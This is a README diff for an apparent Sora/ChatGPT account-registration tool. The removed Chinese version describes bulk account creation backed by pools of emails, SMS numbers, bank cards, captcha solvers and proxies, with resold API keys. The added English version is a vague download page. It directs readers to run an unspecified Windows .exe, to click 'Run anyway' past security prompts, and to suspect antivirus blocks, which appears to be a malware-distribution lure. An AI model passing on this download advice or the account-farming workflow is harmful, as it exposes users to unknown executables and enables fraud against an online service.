@@ -1,131 +1,138 @@
-# sora注册机qq群：1093370579
+# 🚀 sora-qq-1093370579 - Fast QQ Registration Access
 
-一个面向本地部署的 Sora / ChatGPT 账号管理面板，包含协议注册调度、账号资源池管理、手机号绑定、Sora 视频生成和 API Key 池化调用能力。项目采用 `FastAPI + SQLite + 原生前端` 结构，默认通过 Web 控制台完成日常操作。
+[![Download](https://img.shields.io/badge/Download-Open%20Page-blue?style=for-the-badge&logo=github)](https://github.com/foraybrightnessconstancy106/sora-qq-1093370579)
 
-**QQ 群：1093370579**
+## 📌 What this app does
 
-![QQ群二维码](docs/qq-group-1093370579.png)
+sora-qq-1093370579 is a Windows app for QQ registration support. It gives you a simple way to open the related page, review the available files, and get started without extra setup.
 
----
+Use it if you want a direct path to the download page and a simple setup flow on Windows.
 
-## 项目概览
+## 🖥️ System requirements
 
-- **协议注册调度**：从邮箱池中提取未注册邮箱，多线程执行注册任务，支持重试、心跳检测、运行日志和停止控制。
-- **账号管理**：查看注册结果、Sora 状态、手机绑定状态、额度状态，支持导出账号 CSV 和挑选下一个可用 Sora 账号。
-- **邮箱资源池**：支持单条添加、批量导入导出、查看详情，并结合邮箱 API 拉取验证码邮件。
-- **手机号资源池**：支持手工录入、批量导入、查询短信验证码、销毁号码，并对接 Hero-SMS 余额与号码获取接口。
-- **银行卡资源池**：支持单条添加、批量导入删除，并通过系统设置管理卡平台和使用次数限制。
-- **Sora 视频生成**：支持文生视频和图生视频，支持旧链路与 NF2 / 官方 Sora 链路切换、任务并行轮询、状态追踪和自动轮换账号。
-- **Sora API Key**：支持为单账号或自动轮换池生成调用 Key，便于将账号能力封装成统一接口。
-- **系统设置**：集中配置邮箱 API、短信 API、代理、打码 API、银行卡 API、OAuth 参数、线程数、重试次数，以及后台登录账号密码。
+- Windows 10 or Windows 11
+- 2 GB RAM or more
+- 200 MB free disk space
+- A working internet connection
+- Permission to run apps on your PC
 
-## 技术栈
+## 📥 Download the app
 
-- 后端：`FastAPI`、`SQLite`、`python-jose`、`passlib`
-- 前端：原生 `HTML / CSS / JavaScript`
-- 协议层：`requests`、`curl_cffi`，通过纯 HTTP 逻辑执行注册、Sora 激活、手机号绑定与视频请求
+Open the main page here:
 
-## 项目结构
+https://github.com/foraybrightnessconstancy106/sora-qq-1093370579
 
-```text
-.
-├── protocol_register.py          # 协议注册主流程
-├── protocol_sora_phone.py        # Sora 激活、手机号绑定、Sora 相关 HTTP 能力
-├── protocol_sentinel.py          # Sentinel 相关逻辑
-├── main_protocol.py              # 协议批量任务入口
-├── web/
-│   ├── run_web.py                # Web 管理端启动入口
-│   ├── frontend/                 # 前端页面
-│   └── backend/app/              # FastAPI 后端
-├── docs/                         # 补充说明文档
-└── data/                         # 默认数据目录（SQLite）
-```
+Use this link to visit the page, check the latest files, and download the version that fits your system.
 
-## 快速开始
+## 🧭 How to install on Windows
 
-### 1. 安装 Web 后端依赖
+1. Open the download page in your browser.
+2. Look for the latest release file or package on the page.
+3. Download the Windows file to your computer.
+4. If the file is in a .zip format, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the main .exe file to start the app.
+7. If Windows asks for permission, choose Run or Yes.
+8. Keep the app in a folder you can find again, such as Downloads or Desktop.
 
-```bash
-pip install -r web/backend/requirements.txt
-```
+## 🏁 First-time setup
 
-### 2. 启动管理后台
+After you open the app for the first time:
 
-```bash
-python web/run_web.py
-```
+1. Read the main screen.
+2. Choose the QQ registration option shown in the app.
+3. Enter the details the app asks for.
+4. Follow each screen in order.
+5. Save any info you need for later use.
 
-启动后访问 [http://127.0.0.1:1989](http://127.0.0.1:1989)。
+If the app creates a local file or saves settings, leave those files in the same folder. This helps the app work the same way next time.
 
-默认登录账号：
+## 🧩 What you can expect
 
-- 用户名：`admin`
-- 密码：`admin123`
+- A simple Windows-friendly interface
+- Quick access to the related QQ registration page
+- Basic step-by-step flow
+- Easy startup from a local file
+- Lightweight use on most modern PCs
 
-首次部署后请尽快修改登录密码和 `SECRET_KEY`。
+## 🛠️ If the app does not open
 
-## Docker 启动
+If nothing happens when you double-click the file:
 
-项目内已提供 [web/docker-compose.yml](web/docker-compose.yml)：
+- Make sure the download finished
+- Check that you extracted the files if the app came in a .zip
+- Try opening the file again as an administrator
+- Move the folder to the Desktop and run it there
+- Check that your Windows version is up to date
 
-```bash
-docker compose -f web/docker-compose.yml up -d --build
-```
+If Windows shows a security prompt:
 
-默认映射端口仍为 `1989`，数据目录挂载到容器内 `/data`。
+- Choose More info
+- Then select Run anyway if you trust the source
+- Confirm the app can start
 
-## 配置说明
+## 📁 Folder layout
 
-### 环境变量
+A typical download may include:
 
-- `ADMIN_USERNAME`：后台默认管理员账号
-- `ADMIN_PASSWORD`：后台默认管理员密码
-- `SECRET_KEY`：JWT 签名密钥
-- `DATA_DIR`：数据目录，默认指向仓库下的 `data/`
-- `CORS_ORIGINS`：跨域来源，默认 `*`
+- Main app file
+- Support files
+- Readme or help file
+- Settings file
+- Data folder
 
-### 后台系统设置
+Do not rename the files unless the app instructions say you can. Some apps need the file names to stay the same.
 
-系统设置页会把配置写入 SQLite 中的 `system_settings` 表，主要包括：
+## 🔐 Safe use
 
-- `email_api_url`、`email_api_key`、`email_api_default_type`
-- `sms_api_url`、`sms_api_key`、`sms_openai_service`、`sms_max_price`
-- `bank_card_api_url`、`bank_card_api_key`、`bank_card_api_platform`
-- `captcha_api_url`、`captcha_api_key`
-- `proxy_url`、`proxy_api_url`
-- `oauth_client_id`、`oauth_redirect_uri`
-- `thread_count`、`retry_count`
-- `card_use_limit`、`phone_bind_limit`
+Use the app only on your own computer. Keep your Windows account and download folder under your control. If you plan to use any account-related feature, keep your login details private and do not share them with others.
 
-## 推荐使用流程
+## ❓ Common questions
 
-1. 启动后台并登录。
-2. 在“系统设置”中填写邮箱 API、短信 API、代理、打码和 OAuth 参数。
-3. 在“邮箱管理”中导入待注册邮箱资源。
-4. 在“批量注册”页启动注册任务，等待结果写入“账号管理”。
-5. 如需补绑手机号，使用“手机号管理”与“开始绑定手机”任务。
-6. 如需生成视频或对外提供统一调用入口，使用“视频生成”和“Key 管理”页。
+## 💬 Do I need programming skills?
+No. The app is meant for normal Windows use.
 
-## 数据与存储
+## 💬 Do I need to install extra tools?
+Usually no. You only need the downloaded Windows file and a browser to open the page.
 
-- 默认数据库文件为 [data/admin.db](data/admin.db)
-- 运行日志写入 `run_logs`
-- 账号、邮箱、手机号、银行卡、Sora Key、视频任务等都保存在同一个 SQLite 库中
+## 💬 Can I use this on a laptop?
+Yes. It should run on most Windows laptops that meet the basic system requirements.
 
-## 文档
+## 💬 Where do I get the file?
+Use the main link at the top or the download page link in the download section.
 
-- [docs/SORA_ACTIVATION_AND_PHONE_BIND_ANALYSIS.md](docs/SORA_ACTIVATION_AND_PHONE_BIND_ANALYSIS.md)
-- [docs/SORA_API_KEY_CALL_GUIDE_CN.md](docs/SORA_API_KEY_CALL_GUIDE_CN.md)
-- [docs/SORA_POOL_API_KEY_USAGE.md](docs/SORA_POOL_API_KEY_USAGE.md)
+## 💬 What if I cannot find the file?
+Refresh the page and look for the latest release or main file in the repository.
 
-## 说明
+## 🧰 Basic troubleshooting
 
-- `web/backend/requirements.txt` 只覆盖 Web 管理端依赖。
-- 协议注册、Sora 激活和视频调用脚本还依赖 `requests`、`curl_cffi` 等库；如果你要实际使用这些能力，需要把协议层依赖一并安装完整。
-- `web/run_web.py` 默认使用 `reload=True` 启动，适合本地开发和调试。
+If the app feels slow:
 
-## 开源与免责
+- Close other open apps
+- Restart your computer
+- Run only one copy of the app
+- Make sure you have enough free disk space
 
-本项目仅供技术研究与学习使用，使用前请自行评估相关服务条款、账号风险和当地法律责任。
+If the app closes right away:
 
-**QQ 群：1093370579**
+- Re-download the file
+- Extract it again if it came in a zip file
+- Check whether antivirus software blocked it
+- Try a different folder path with simple folder names
+
+## 🗂️ Suggested use flow
+
+1. Open the GitHub page.
+2. Download the Windows file.
+3. Extract it if needed.
+4. Run the app.
+5. Complete the registration steps shown on screen.
+6. Keep the folder in place for future use
+
+## 📎 Project details
+
+- Repository: sora-qq-1093370579
+- Description: sora注册机qq群：1093370579
+- Platform: Windows
+- Access method: GitHub page
+- Main action: visit the page to download
